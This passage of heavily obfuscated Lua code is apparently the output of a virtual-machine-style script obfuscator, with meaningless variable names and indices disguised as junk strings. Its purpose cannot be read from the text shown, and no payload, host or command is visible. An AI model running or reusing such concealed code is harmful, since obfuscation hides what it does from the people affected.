Iq")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#{{882;237;883;449};{618;16;615;926};}]]=btwbaby_IllIIlllIIIIlIllIl[btwbaby_IllIIIllIlIIIIIlIIIllII[#("z7Y")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("qP")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("BHg")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("SU11")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("Ir")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#{"1 + 1 = 111";{898;488;15;688};"1 + 1 = 111";}];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("lj")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("KCs")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("YE")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("KfN")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_IIlIllIIlIlIIlIIIl=btwbaby_IllIIIllIlIIIIIlIIIllII[#("qU")]btwbaby_llllIllI[btwbaby_IIlIllIIlIlIIlIIIl]=btwbaby_llllIllI[btwbaby_IIlIllIIlIlIIlIIIl](btwbaby_lIIlIlIIlIlIl(btwbaby_llllIllI,btwbaby_IIlIllIIlIlIIlIIIl+1,btwbaby_IllIIIllIlIIIIIlIIIllII[#("yYN")]))btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("Gn")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("XkF")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("rf3I")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#{{507;806;616;301};"1 + 1 = 111";}]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("S9y")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("jTOZ")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("3j")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("bUk")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("ornC")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("rN")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("r8H")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("pOEq")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("4g")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("7WU")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("VzRm")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("3I")]]=btwbaby_IllIIlllIIIIlIllIl[btwbaby_IllIIIllIlIIIIIlIIIllII[#("1Vh")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#{{545;296;751;457};{566;176;281;543};}]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#{"1 + 1 = 111";{280;292;63;880};{501;799;551;555};}]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("Sicr")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("eO")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#{{489;33;779;894};{466;233;930;968};"1 + 1 = 111";}];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("9O")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("uRO")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("b8")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("c7s")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_IIlIllIIlIlIIlIIIl=btwbaby_IllIIIllIlIIIIIlIIIllII[#("TH")]btwbaby_llllIllI[btwbaby_IIlIllIIlIlIIlIIIl]=btwbaby_llllIllI[btwbaby_IIlIllIIlIlIIlIIIl](btwbaby_lIIlIlIIlIlIl(btwbaby_llllIllI,btwbaby_IIlIllIIlIlIIlIIIl+1,btwbaby_IllIIIllIlIIIIIlIIIllII[#("MTU")]))btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("GK")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("r0D")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("PrIy")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("80")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("JxJ")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("kqqv")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("Qx")]]=btwbaby_IllIIlllIIIIlIllIl[btwbaby_IllIIIllIlIIIIIlIIIllII[#("dxp")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("Gq")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#{{407;63;991;51};"1 + 1 = 111";"1 + 1 = 111";}]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("FJcI")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("4q")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("ptG")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#{{235;464;146;936};{387;554;59;164};}]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("tKg")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("xk")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("tqn")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("mC")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#{"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";}];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_IIlIllIIlIlIIlIIIl=btwbaby_IllIIIllIlIIIIIlIIIllII[#("c9")]btwbaby_llllIllI[btwbaby_IIlIllIIlIlIIlIIIl]=btwbaby_llllIllI[btwbaby_IIlIllIIlIlIIlIIIl](btwbaby_lIIlIlIIlIlIl(btwbaby_llllIllI,btwbaby_IIlIllIIlIlIIlIIIl+1,btwbaby_IllIIIllIlIIIIIlIIIllII[#("brY")]))btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("F1")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("JiG")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#{{705;314;278;140};{419;540;77;833};{25;625;645;68};{276;559;631;650};}]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("zI")]]=btwbaby_IllIIlllIIIIlIllIl[btwbaby_IllIIIllIlIIIIIlIIIllII[#("tZI")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("Bz")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("BNn")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("eqKQ")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("64")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("uMp")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("WA")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("mLF")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("2J")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("T2q")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("vf")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("iIh")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_IIlIllIIlIlIIlIIIl=btwbaby_IllIIIllIlIIIIIlIIIllII[#("6a")]btwbaby_llllIllI[btwbaby_IIlIllIIlIlIIlIIIl]=btwbaby_llllIllI[btwbaby_IIlIllIIlIlIIlIIIl](btwbaby_lIIlIlIIlIlIl(btwbaby_llllIllI,btwbaby_IIlIllIIlIlIIlIIIl+1,btwbaby_IllIIIllIlIIIIIlIIIllII[#("Sh9")]))btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#{{955;934;634;407};"1 + 1 = 111";}]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("L5g")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#{{978;954;897;541};"1 + 1 = 111";{989;150;731;374};"1 + 1 = 111";}]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("ps")]]=btwbaby_IllIIlllIIIIlIllIl[btwbaby_IllIIIllIlIIIIIlIIIllII[#("X4Z")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("36")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("bik")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("aRvC")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("Hk")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("dLQ")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#{{162;794;380;891};{467;768;693;176};{277;193;523;106};{181;121;339;254};}]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("uh")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("9v5")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("9xhh")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("IE")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("Xg7")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("lvji")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("Ge")]]=btwbaby_IllIIlllIIIIlIllIl[btwbaby_IllIIIllIlIIIIIlIIIllII[#("1nD")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#{"1 + 1 = 111";"1 + 1 = 111";}]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("SUp")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("8bf5")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("bu")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("NDb")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("lR")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("GhF")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("zJ")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("VaQ")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_IIlIllIIlIlIIlIIIl=btwbaby_IllIIIllIlIIIIIlIIIllII[#("iN")]btwbaby_llllIllI[btwbaby_IIlIllIIlIlIIlIIIl]=btwbaby_llllIllI[btwbaby_IIlIllIIlIlIIlIIIl](btwbaby_lIIlIlIIlIlIl(btwbaby_llllIllI,btwbaby_IIlIllIIlIlIIlIIIl+1,btwbaby_IllIIIllIlIIIIIlIIIllII[#("SKo")]))btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("Uk")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("2pY")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("zS2u")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#{"1 + 1 = 111";{751;361;995;778};}]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("mJ8")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("WKjJ")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("1o")]]=btwbaby_IllIIlllIIIIlIllIl[btwbaby_IllIIIllIlIIIIIlIIIllII[#("7Aq")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("kH")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("CdX")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("YmLE")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("QY")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("31e")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("p4rY")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("GA")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("Jpv")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("SiD9")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("cI")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("1NP")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("GoIP")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("Lo")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("Bx9")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("9LBi")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("oS")]]=btwbaby_IllIIlllIIIIlIllIl[btwbaby_IllIIIllIlIIIIIlIIIllII[#("953")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("5h")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("63f")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("o0Ee")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("Om")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#{"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";}];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("HX")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#{{486;604;781;984};{889;973;866;832};{36;340;837;523};}];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("Wh")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("nyR")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_IIlIllIIlIlIIlIIIl=btwbaby_IllIIIllIlIIIIIlIIIllII[#{{928;89;709;949};"1 + 1 = 111";}]btwbaby_llllIllI[btwbaby_IIlIllIIlIlIIlIIIl]=btwbaby_llllIllI[btwbaby_IIlIllIIlIlIIlIIIl](btwbaby_lIIlIlIIlIlIl(btwbaby_llllIllI,btwbaby_IIlIllIIlIlIIlIIIl+1,btwbaby_IllIIIllIlIIIIIlIIIllII[#("GO8")]))btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("G1")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("46F")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("zmI9")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("CG")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("4ld")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("8VQ9")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("t2")]]=btwbaby_IllIIlllIIIIlIllIl[btwbaby_IllIIIllIlIIIIIlIIIllII[#("B9K")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("6f")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("kuv")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("dUqH")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#{"1 + 1 = 111";"1 + 1 = 111";}]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("Waf")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("gj")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#{{343;588;82;731};"1 + 1 = 111";{862;438;647;940};}];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("S5")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("W7J")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_IIlIllIIlIlIIlIIIl=btwbaby_IllIIIllIlIIIIIlIIIllII[#("NG")]btwbaby_llllIllI[btwbaby_IIlIllIIlIlIIlIIIl]=btwbaby_llllIllI[btwbaby_IIlIllIIlIlIIlIIIl](btwbaby_lIIlIlIIlIlIl(btwbaby_llllIllI,btwbaby_IIlIllIIlIlIIlIIIl+1,btwbaby_IllIIIllIlIIIIIlIIIllII[#{"1 + 1 = 111";"1 + 1 = 111";{985;67;277;478};}]))btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("7i")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("6qI")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("po3E")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#{"1 + 1 = 111";{94;811;299;649};}]]=btwbaby_IllIIlllIIIIlIllIl[btwbaby_IllIIIllIlIIIIIlIIIllII[#("zGi")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("39")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("D1P")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("HcEU")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("zf")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("vtH")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIII